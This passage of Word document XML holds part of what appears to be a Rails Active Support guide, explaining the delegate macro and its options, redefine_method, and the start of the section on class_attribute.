                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7E6B8F65" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">That is what </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>delegate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> does for you:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4128"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1C534877" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F69221A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F4E4EEE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :profile</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A36FAAA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A3B55DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  delegate :name, :to</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :profile</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41595D0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="420FAC10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>It is shorter, and the intention more obvious.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E48A971" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The method must be public in the target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="749946C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>delegate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> macro accepts several methods:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6768"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2D6B1C89" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="373CAAA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="194122565"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>delegate :name, :age, :address, :twitter, :to</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :profile</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="01328E23" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When interpolated into a string, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option should become an expression that evaluates to the object the method is delegated to. Typically a string or symbol. Such an expression is evaluated in the context of the receiver:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4848"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0DD9E960" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0B838A71" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># delegates to the Rails constant</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5062CD98" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>delegate :logger, :to</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :Rails</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="79761C91" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4332CED4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># delegates to the receiver's class</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F356114" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>delegate :table_name, :to</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'self.class'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7BDAC8AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:prefix</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> this is less generic, see below.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1351E65A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By default, if the delegation raises </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NoMethodError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the target is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the exception is propagated. You can ask that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is returned instead with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:allow_nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5975"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="120EF874" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47FEB913" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="100148010"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>delegate :name, :to</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :profile, :allow_nil</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="635E38DB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:allow_nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>user.name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if the user has no profile.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B804AC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The option </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:prefix</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> adds a prefix to the name of the generated method. This may be handy for example to get a better name:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5855"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4A988E1A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E980F88" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="326595857"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>delegate :street, :to</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :address, :prefix</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5990500A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The previous example generates </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>address_street</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> rather than </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>street</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105B6C3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Since in this case the name of the generated method is composed of the target object and target method names, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option must be a method name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5473D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A custom prefix may also be configured:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6335"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="271F6A78" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28ECFFD6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="219027267"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>delegate :size, :to</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :attachment, :prefix</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :avatar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7B443A22" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the previous example the macro generates </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>avatar_size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> rather than </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>size</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03772191" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/delegation.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4F6ADB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.8 Redefining Methods</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC3095B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There are cases where you need to define a method with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>define_method</w:t>
      </w:r>
      <w:r>
        <w:t>, but don’t know whether a method with that name already exists. If it does, a warning is issued if they are enabled. No big deal, but not clean either.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4AD1EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redefine_method</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> prevents such a potential warning, removing the existing method before if needed. Rails uses it in a few places, for instance when it generates an association’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</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45F86F61" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37648A8D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>redefine_method("#{reflection.name}=") do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|new_value|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27241D10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  association = association_instance_get(reflection.name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F7BC07C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39942E70" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>association.nil? || association.target != new_value</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04C64CEB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    association = association_proxy_class.new(self, reflection)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="468178C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70029CD1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F46DECF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  association.replace(new_value)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CDE7FCB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  association_instance_set(reflection.name, new_value.nil? ? nil</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>: association)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0ED96B5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66D5B69A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/remove_method.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCB0E09" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Class</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE62BD0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 Class Attributes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="682B9B68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>class_attribute</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF5E49B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>class_attribute</w:t>
      </w:r>
      <w:r>
